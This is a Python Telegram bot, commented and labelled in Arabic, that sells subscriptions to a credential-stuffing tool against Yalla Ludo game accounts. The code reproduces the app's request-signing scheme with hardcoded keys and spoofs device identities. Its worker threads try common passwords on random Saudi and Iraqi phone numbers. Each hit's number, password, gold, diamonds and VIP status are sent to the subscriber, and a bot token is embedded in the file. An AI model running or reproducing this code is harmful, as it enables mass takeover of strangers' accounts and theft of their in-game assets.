import base64
import hashlib
import hmac
import html
import json
import os
import random
import sys
import time
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Dict, List, Optional, Set
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests
from requests.adapters import HTTPAdapter
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

#-----------------(إعدادات البوت والمدير)-----------------#
BOT_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg" 
ADMIN_ID = 8795120325  # الآيدي الخاص بك (المطور)
SUBS_FILE = "subscriptions.json"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

#-----------------(سيرفرات يالا لدو - مرجع[span_0](start_span)[span_0](end_span))-----------------#
VER    = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
VERH   = "1.4.9.2"
SPRE   = "2.0_2_"
L3     = "L3)qk*@8"
MKEY   = b"4e82797b276c5cb729db62aaa229a057"
MIV    = b"0102030405060708"
K      = "8a9520f016427a54d5de40335bf7e4fe"
K2     = "c889f8f7dc69b1d67e1d3e43cf48f430"
PATH          = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
PROFILE_PATH  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
SERVER        = "https://httpgateway.lampjkl.com"
TIMEOUT       = 15
HERA_STATIC   = "f580270da66e44438d5ed30fdb08ebba"

PROFILE_SRVS = [
    "https://httpgateway.lampjkl.com",
    "https://httpgateway.planecde.com",
    "https://httpgateway.funcdeg.com",
    "https://httpgateway.carrstuv.com",
    "https://httpgateway.yalla.games",
]

HCONF = [
    {"bizType": 5000, "countryCode": "SA", "hostUrl": "https://api-shumeng.moonlmn.com",    "type": 2, "version": 4},
    {"bizType": 5001, "countryCode": "",   "hostUrl": "ws://firebreak.yalla.games",          "type": 1, "version": 1},
    {"bizType": 5004, "countryCode": "SA", "hostUrl": "https://httpgateway.penabcd.com",     "type": 2, "version": 6},
    {"bizType": 5005, "countryCode": "SA", "hostUrl": "https://api.lightkvd.com",            "type": 2, "version": 4},
    {"bizType": 1000, "countryCode": "SA", "hostUrl": "https://account.lampjkl.com",        "type": 2, "version": 19},
    {"bizType": 1001, "countryCode": "SA", "hostUrl": "https://pay.lampjkl.com",            "type": 2, "version": 17},
    {"bizType": 1002, "countryCode": "SA", "hostUrl": "https://mail.lampjkl.com",           "type": 2, "version": 18},
    {"bizType": 1003, "countryCode": "SA", "hostUrl": "https://clog.lampjkl.com",           "type": 2, "version": 17},
    {"bizType": 1006, "countryCode": "SA", "hostUrl": "https://httpgateway.lampjkl.com",    "type": 2, "version": 20},
    {"bizType": 1007, "countryCode": "SA", "hostUrl": "wss://tyr.lampjkl.com",              "type": 2, "version": 18},
    {"bizType": 1008, "countryCode": "SA", "hostUrl": "wss://hall.lampjkl.com",             "type": 2, "version": 39},
    {"bizType": 2006, "countryCode": "SA", "hostUrl": "https://nitrogen.lampjkl.com",       "type": 2, "version": 19},
    {"bizType": 2007, "countryCode": "SA", "hostUrl": "wss://room.lampjkl.com",             "type": 2, "version": 22},
    {"bizType": 2008, "countryCode": "SA", "hostUrl": "wss://roomgame.lampjkl.com",         "type": 2, "version": 18},
    {"bizType": 3000, "countryCode": "SA", "hostUrl": "https://file.carrstuv.com",          "type": 2, "version": 27},
    {"bizType": 6000, "countryCode": "",   "hostUrl": "https://broadcast-host.ylconfig.com","type": 1, "version": 0},
]

DEVS = [
    ("OnePlus 9 Pro", "LE2123", "SA", "SA", 2),
    ("Samsung Galaxy S21", "SM-G991B", "AE", "AE", 2),
    ("Xiaomi Mi 11", "M2011K2G", "SA", "SA", 2),
    ("Realme GT", "RMX2202", "EG", "EG", 2),
    ("Oppo Reno 6", "CPH2235", "SA", "SA", 2),
    ("Samsung Galaxy A52", "SM-A525F", "SA", "SA", 2),
]

thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=40, pool_maxsize=40, max_retries=1)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        thread_local.session = session
    return thread_local.session

#-----------------(نظام إدارة الاشتراكات)-----------------#
def load_subscriptions() -> Dict[str, float]:
    if os.path.exists(SUBS_FILE):
        try:
            with open(SUBS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_subscriptions(subs: Dict[str, float]):
    with open(SUBS_FILE, "w", encoding="utf-8") as f:
        json.dump(subs, f, ensure_ascii=False, indent=4)

def is_user_active(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    subs = load_subscriptions()
    str_uid = str(user_id)
    if str_uid in subs:
        if time.time() < subs[str_uid]:
            return True
    return False

# قاموس لحفظ حالة فحص كل مستخدم بشكل مستقل تماماً (منع التداخل)[span_1](start_span)[span_1](end_span)
user_active_scans: Dict[int, Dict[str, Any]] = {}

#-----------------(دوال فحص يالا لدو - مرجع[span_2](start_span)[span_2](end_span))-----------------#
def gen_hera() -> str:
    return HERA_STATIC

def _aes_cbc(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(plaintext, AES.block_size))

def _xor_b64(data_str: str, key_str: str) -> str:
    kb = key_str.encode()
    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
    return base64.b64encode(xo).decode()

def _gen_shu_meng_id() -> str:
    import secrets
    raw = secrets.token_bytes(28)
    b64 = base64.b64encode(raw).decode()
    return b64.replace("+", "-").replace("/", "_").rstrip("=")[:38]

def _rdev() -> Dict[str, Any]:
    nm, md, pc, sc, dt = random.choice(DEVS)
    brand = nm.split()[0].lower()
    return {
        "deviceId": str(uuid.uuid4()),
        "deviceName": f"{brand} {md}",
        "deviceType": dt,
        "phoneModel": md,
        "X-Phone-Country": pc,
        "X-Sim-Country": sc,
        "downloadChannelId": 1,
        "shuMengId": _gen_shu_meng_id(),
        "AndroidId": uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
        "plateType": 0,
        "LanguageId": 2,
        "appType": 0,
    }

def _gen_traceparent() -> str:
    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"

def _build_request(mobile: str, password: str, area_code: int = 966, hconf: List[Dict] = HCONF) -> Dict[str, Any]:
    d = _rdev()
    now = int(time.time() * 1000)
    nc = f"{random.randint(0, 2**31 - 1)}_{uuid.uuid4()}"

    bag = {
        "timeSpan": str(now), "version": VERH, "deviceId": d["deviceId"],
        "deviceName": d["deviceName"], "deviceType": d["deviceType"],
        "downloadChannelId": d["downloadChannelId"], "shuMengId": d["shuMengId"],
        "nonce": nc, "plateType": d["plateType"], "LanguageId": d["LanguageId"],
        "phoneModel": d["phoneModel"], "X-Phone-Country": d["X-Phone-Country"],
        "X-Sim-Country": d["X-Sim-Country"], "AndroidId": d["AndroidId"], "appType": d["appType"],
    }
    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()

    sg = PATH + VER + bb
    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs = SPRE + sig

    p = hashlib.md5(sg.encode()).hexdigest()
    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    phex = hashlib.md5(password.encode()).hexdigest().upper()
    body = {
        "mobile": mobile, "areaCode": area_code, "password": phex,
        "languageId": d["LanguageId"], "nationalityId": 1, "hostConfig": hconf,
        "simCountry": "", "version": VERH, "deviceId": d["deviceId"],
        "deviceName": d["deviceName"], "deviceType": d["deviceType"],
        "downloadChannelId": d["downloadChannelId"], "shuMengId": d["shuMengId"],
        "nonce": nc, "plateType": d["plateType"], "phoneModel": d["phoneModel"],
        "X-Phone-Country": d["X-Phone-Country"], "X-Sim-Country": d["X-Sim-Country"],
        "AndroidId": d["AndroidId"], "IsSubpackages": 0, "appType": d["appType"],
    }
    bs = json.dumps(body, separators=(",", ":"), ensure_ascii=False).replace("/", "\\/")
    pm = _xor_b64(bs, K)

    ts_stamp = now + random.randint(40, 80)
    ts_time = ts_stamp + random.randint(30, 60)

    hd = {
        "User-Agent": VER, "UserId": "0", "X-App-Id": "ludo",
        "X-Baggage": bb, "X-Access-Token": "", "X-Timestamp": str(ts_stamp),
        "versionString": VERH, "X-Sign": xs, "X-Hera": gen_hera(),
        "X-Time": str(ts_time), "X-Medusa": xm,
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip", "Connection": "Keep-Alive",
        "baggage": "service.name=ludo", "traceparent": _gen_traceparent(),
    }
    return {"url": SERVER + PATH, "headers": hd, "payload": {"paramJsonString": pm}, "dev": d}

def _post_login_req(path: str, server: str, payload_dict: Dict, token: str, user_id: str, dev: Dict, proxies=None, timeout: int = TIMEOUT) -> Dict:
    session = get_session()
    now = int(time.time() * 1000)
    nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
    bag_sign = hashlib.md5((K2 + nc).encode()).hexdigest().upper()

    bag = {
        "token": token, "sign": bag_sign, "timeSpan": str(now), "version": VERH,
        "deviceId": dev["deviceId"], "deviceName": dev["deviceName"],
        "deviceType": dev["deviceType"], "downloadChannelId": dev["downloadChannelId"],
        "shuMengId": dev["shuMengId"], "nonce": nc, "plateType": dev["plateType"],
        "LanguageId": dev["LanguageId"], "phoneModel": dev["phoneModel"],
        "X-Phone-Country": dev["X-Phone-Country"], "X-Sim-Country": dev["X-Sim-Country"],
        "AndroidId": dev["AndroidId"], "appType": dev["appType"],
    }
    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()

    sg = path + token + VER + bb
    sig = hmac.new(K2.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs = SPRE + sig

    p = hashlib.md5(sg.encode()).hexdigest()
    mp = f"{p}-{len(sg)}-{K2}-{L3}".encode()
    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    hd = {
        "User-Agent": VER, "UserId": user_id, "X-App-Id": "ludo",
        "X-Baggage": bb, "X-Access-Token": token, "X-Timestamp": str(now + random.randint(50, 300)),
        "versionString": VERH, "X-Sign": xs, "X-Hera": gen_hera(),
        "X-Time": str(now + random.randint(50, 300)), "X-Medusa": xm,
        "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip",
    }
    bs = json.dumps(payload_dict, separators=(",", ":"), ensure_ascii=False)
    pm = _xor_b64(bs, K2)

    try:
        r = session.post(server + path, json={"paramJsonString": pm}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
        if r.status_code == 403:
            pm2 = _xor_b64(bs, K)
            r = session.post(server + path, json={"paramJsonString": pm2}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
        obj = r.json()
        if obj.get("status") == 0:
            return {"ok": True, "data": obj.get("data") or {}, "raw": obj}
        return {"ok": False, "status": obj.get("status"), "tips": obj.get("tips", ""), "raw": obj, "http": r.status_code}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def fetch_profile(token: str, user_id: str, dev: Dict, login_data: Dict, proxies=None, timeout: int = TIMEOUT) -> Optional[Dict]:
    srvs = []
    for h in (login_data.get("hostConfig") or []):
        if h.get("bizType") == 1006 and h.get("hostUrl"):
            for url in h["hostUrl"].split(","):
                url = url.strip().rstrip("/")
                if url and url not in srvs: srvs.append(url)
            break
    for s in PROFILE_SRVS:
        if s not in srvs: srvs.append(s)

    uid_int = int(user_id) if str(user_id).isdigit() else user_id
    payloads = [{"userId": uid_int}, {"id": uid_int}, {"targetUserId": uid_int}]

    for srv in srvs:
        for payload in payloads:
            res = _post_login_req(PROFILE_PATH, srv, payload, token, user_id, dev, proxies, timeout)
            if res.get("ok"):
                data = res.get("data") or {}
                if data: return data
            if res.get("http") == 403: break
    return None

def _extract_wallet(profile: Optional[Dict]):
    if not profile: return "—", "—", "—", False, 0
    base = profile.get("baseInfo") or profile.get("userInfo") or profile.get("wealthInfo") or profile.get("accountInfo") or profile
    gold = base.get("goldNum") or base.get("gold") or base.get("coins") or base.get("coinNum") or "—"
    diamond = base.get("diamondNum") or base.get("diamond") or base.get("gems") or base.get("gemNum") or "—"
    level = base.get("levelId") or base.get("level") or "—"
    is_vip = base.get("isVip") or base.get("vip") or False
    royal = base.get("royalLevel") or base.get("royal") or 0
    return gold, diamond, level, is_vip, royal

def login(mobile: str, password: str, area_code: int = 966, timeout: int = TIMEOUT, server: str = SERVER) -> Dict[str, Any]:
    session = get_session()
    rq = _build_request(mobile, password, area_code)
    rq["url"] = server + PATH
    try:
        r = session.post(rq["url"], json=rq["payload"], headers=rq["headers"], timeout=timeout, verify=True)
    except Exception as ex:
        return {"success": False, "error": str(ex), "dev": rq["dev"]}

    try:
        obj = r.json()
    except Exception:
        return {"success": False, "error": f"HTTP {r.status_code}", "dev": rq["dev"]}

    if obj.get("status") == 0:
        data = obj.get("data") or {}
        result = {"success": True, "data": data, "dev": rq["dev"]}
        token = data.get("token", "")
        user_id = str(data.get("id", data.get("showNumId", "")))
        if token and user_id:
            prof = fetch_profile(token, user_id, rq["dev"], data, timeout=timeout)
            result["profile"] = prof
        return result

    return {"success": False, "status": obj.get("status"), "tips": obj.get("tips", "خطأ"), "dev": rq["dev"]}

def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = None) -> str:
    raw_name = data.get("name") or data.get("nickName", "—")
    name = html.escape(str(raw_name))
    show_id = data.get("showNumId") or data.get("id", "—")
    
    lines = [
        "<b>New Account Ludo ✅</b>",
        f"📱 <b>Number :</b> <code>{mobile}</code>",
        f"🔑 <b>Pass :</b> <code>{password}</code>",
    ]
    if profile:
        gold, diamond, level, is_vip, royal = _extract_wallet(profile)
        lines += [
            f"💛 <b>الذهب:</b> {gold}",
            f"💎 <b>الجواهر:</b> {diamond}",
            f"🏆 <b>المستوى:</b> {level}",
            f"👑 <b>VIP:</b> {'نعم ✅' if is_vip else 'لا ❌'}",
        ]
        if royal and royal != 0:
            lines.append(f"🌟 <b>Royal Level:</b> {royal}")
    lines.append("By - @aboodriad")
    return "\n".join(lines)

def generate_saudi_number() -> str:
    return random.choice(["50", "53", "54", "55", "56", "57", "58", "59"]) + "".join(str(random.randint(0, 9)) for _ in range(7))

def generate_iraqi_number() -> str:
    return random.choice(["70", "77", "78", "79", "75"]) + "".join(str(random.randint(0, 9)) for _ in range(8))

#-----------------(الأزرار الشفافة)-----------------#

def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("تشغيل الفحص", callback_data="start_scan"))
    markup.add(InlineKeyboardButton("نوع اشتراكي", callback_data="my_sub"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("لوحة المطور", callback_data="admin_panel"))
    return markup

def get_scanning_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ايقاف الفحص", callback_data="stop_scan"))
    return markup

def get_admin_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("تفعيل مستخدم", callback_data="admin_add"))
    markup.add(InlineKeyboardButton("حذف مستخدم", callback_data="admin_del"))
    markup.add(InlineKeyboardButton("عدد المشتركين", callback_data="admin_list"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
    return markup

#-----------------(الأوامر والواجهات)-----------------#

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    if not is_user_active(user_id):
        bot.reply_to(message, "❌ لا يمكنك استخدام البوت، يرجى التواصل مع المطور لتفعيل اشتراكك.")
        return
    
    welcome_text = (
        "مرحبا عزيزي في بوت فحص حسابات يلا لودو المدفوع\nنوع الفحص و سيرفرات ( سعودي و عراقي )\nقم بتشغيل الفحص الان 🤍"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not is_user_active(user_id) and call.data != "my_sub":
        try:
            bot.answer_callback_query(call.id, "❌ لا يمكنك استخدام البوت، الاشتراك منتهي أو غير فعال.", show_alert=True)
        except Exception:
            pass
        return

    if call.data == "main_menu":
        # إذا كان المستخدم في شاشة الفحص ولديه رسالة فحص مستقلة، نقوم بإيقاف الفحص أو تنظيف حالته
        if user_id in user_active_scans:
            user_active_scans[user_id]["running"] = False
        try:
            bot.edit_message_text("مرحبا عزيزي في بوت فحص حسابات يلا لودو المدفوع\nنوع الفحص و سيرفرات ( سعودي و عراقي )\nقم بتشغيل الفحص الان 🤍", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
        except Exception:
            pass

    elif call.data == "my_sub":
        subs = load_subscriptions()
        str_uid = str(user_id)
        if user_id == ADMIN_ID:
            sub_status = "مدير البوت (صلاحيات كاملة 👑)"
        elif str_uid in subs and time.time() < subs[str_uid]:
            rem_days = int((subs[str_uid] - time.time()) / 86400)
            sub_status = f"فعال ✅ (متبقي حوالي {rem_days} يوم)"
        else:
            sub_status = "غير فعال ❌"
        
        text = f"👤 <b>معلوماتك الشخصية:</b>\n🆔 الآيدي: <code>{user_id}</code>\n📌 حالة الاشتراك: {sub_status}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="main_menu"))
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data == "start_scan":
        if user_id in user_active_scans and user_active_scans[user_id].get("running"):
            try:
                bot.answer_callback_query(call.id, "⚠️ عملية الفحص تعمل بالفعل لديك!", show_alert=True)
            except Exception:
                pass
            return

        # إرسال رسالة جديدة كلياً خاصة بالفحص لهذا المستخدم فقط (عزل تام للواجهة)
        try:
            bot.delete_message(chat_id, message_id)
        except Exception:
            pass

        scan_msg = bot.send_message(
            chat_id,
            "<b>جاري بدء الفحص التلقائي السريع...</b>\n\n"
            "صيد صحيح: 0\n"
            "خطأ: 0\n"
            "أخطاء اتصال: 0",
            reply_markup=get_scanning_keyboard()
        )

        # تهيئة العدادات والبيانات الخاصة بهذا المستخدم حصرياً
        user_active_scans[user_id] = {
            "running": True,
            "valid": 0,
            "wrong": 0,
            "error": 0,
            "message_id": scan_msg.message_id
        }

        # تشغيل خيوط الفحص الخاصة بالمستخدم
        threading.Thread(target=run_user_scanner, args=(user_id, chat_id, scan_msg.message_id), daemon=True).start()

    elif call.data == "stop_scan":
        if user_id in user_active_scans:
            user_active_scans[user_id]["running"] = False
        try:
            bot.answer_callback_query(call.id, "تم إيقاف الفحص.")
            bot.edit_message_text(
                "<b>تم إيقاف عملية الفحص الخاصة بك.</b>",
                chat_id, message_id,
                reply_markup=get_main_keyboard(user_id)
            )
        except Exception:
            pass

    # لوحة المطور
    elif call.data == "admin_panel" and user_id == ADMIN_ID:
        text = "⚙️ <b>لوحة تحكم المطور:</b>\nاختر الإجراء المطلوب:"
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=get_admin_keyboard())
        except Exception:
            pass

    elif call.data == "admin_add" and user_id == ADMIN_ID:
        try:
            msg = bot.send_message(chat_id, "✍️ أرسل آيدي المستخدم ومدة التفعيل بالأيام بالصيغة التالية:\n<code>ID DAYS</code>\nمثال:\n<code>123456789 7</code>")
            bot.register_next_step_handler(msg, process_add_sub)
        except Exception:
            pass

    elif call.data == "admin_del" and user_id == ADMIN_ID:
        try:
            msg = bot.send_message(chat_id, "✍️ أرسل آيدي المستخدم المراد حذف تفعيله:\nمثال:\n<code>123456789</code>")
            bot.register_next_step_handler(msg, process_del_sub)
        except Exception:
            pass

    elif call.data == "admin_list" and user_id == ADMIN_ID:
        subs = load_subscriptions()
        if not subs:
            text = "📋 لا توجد اشتراكات مسجلة حالياً."
        else:
            text = "📋 <b>قائمة المشتركين النشطين:</b>\n\n"
            for uid, exp in subs.items():
                if time.time() < exp:
                    days_left = int((exp - time.time()) / 86400)
                    text += f"• <code>{uid}</code> (متبقي {days_left} يوم)\n"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        except Exception:
            pass

#-----------------(منظومة الفحص السريع والمعزول لكل مستخدم)-----------------#

def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
    passwords = ["Aa123123", "Aa123456", "Aa12341234", "Aa12345678", "1q2w3e4r", "qwer1234"]
    max_threads = 8  # سرعة عالية في الفحص لكل مستخدم

    def worker():
        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
            try:
                country_choice = random.choice(["SA", "IQ"])
                if country_choice == "SA":
                    mobile = generate_saudi_number()
                    area_code = 966
                else:
                    mobile = generate_iraqi_number()
                    area_code = 964

                password = random.choice(passwords)
                res = login(mobile, password, area_code=area_code, timeout=TIMEOUT, server=SERVER)

                if user_id not in user_active_scans or not user_active_scans[user_id]["running"]:
                    break

                if res["success"]:
                    user_active_scans[user_id]["valid"] += 1
                    prof = res.get("profile")
                    txt = _tg_text(res["data"], mobile, password, profile=prof)
                    try:
                        bot.send_message(chat_id, f"<b>تم صيد حساب جديد</b>\n\n{txt}")
                    except Exception:
                        pass
                else:
                    if "error" in res:
                        user_active_scans[user_id]["error"] += 1
                    else:
                        user_active_scans[user_id]["wrong"] += 1
            except Exception:
                if user_id in user_active_scans:
                    user_active_scans[user_id]["error"] += 1
                time.sleep(0.5)

    # تشغيل خيوط متعددة سريعة خاصة بالمستخدم الحالي فقط
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for _ in range(max_threads):
            if user_id in user_active_scans and user_active_scans[user_id]["running"]:
                executor.submit(worker)

        last_update_text = ""
        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
            state = user_active_scans[user_id]
            v = state["valid"]
            w = state["wrong"]
            e = state["error"]

            status_text = (
                f"<b>جاري فحص الحسابات بشكل سريع ومستقل...</b>\n\n"
                f"صيد صحيح: {v}\n"
                f"خطأ: {w}\n"
                f"أخطاء اتصال: {e}"
            )

            if status_text != last_update_text:
                try:
                    bot.edit_message_text(
                        status_text,
                        chat_id,
                        scan_msg_id,
                        reply_markup=get_scanning_keyboard()
                    )
                    last_update_text = status_text
                except Exception:
                    pass
            time.sleep(1.5)

#-----------------(وظائف المطور لتفعيل الاشتراكات)-----------------#

def process_add_sub(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        parts = message.text.strip().split()
        target_id = parts[0]
        days = int(parts[1])
        
        subs = load_subscriptions()
        expiry_time = time.time() + (days * 86400)
        subs[target_id] = expiry_time
        save_subscriptions(subs)
        
        bot.reply_to(message, f"✅ تم تفعيل المستخدم <code>{target_id}</code> لمدة {days} يوم بنجاح.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ في الصيغة: {e}")

def process_del_sub(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        target_id = message.text.strip()
        subs = load_subscriptions()
        if target_id in subs:
            del subs[target_id]
            save_subscriptions(subs)
            bot.reply_to(message, f"✅ تم حذف تفعيل المستخدم <code>{target_id}</code> بنجاح.")
        else:
            bot.reply_to(message, "❌ هذا المستخدم غير موجود في قائمة المشتركين.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

#-----------------(تشغيل البوت مع نظام الاتصال التلقائي)-----------------#
if __name__ == "__main__":
    print("🤖 Telegram Bot is running with Isolated User Interfaces & Auto-Reconnect...")
    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"⚠️ حدث انقطاع في الاتصال: {e}")
            print("🔄 جاري إعادة المحاولة خلال 5 ثوانٍ...")
            time.sleep(5)
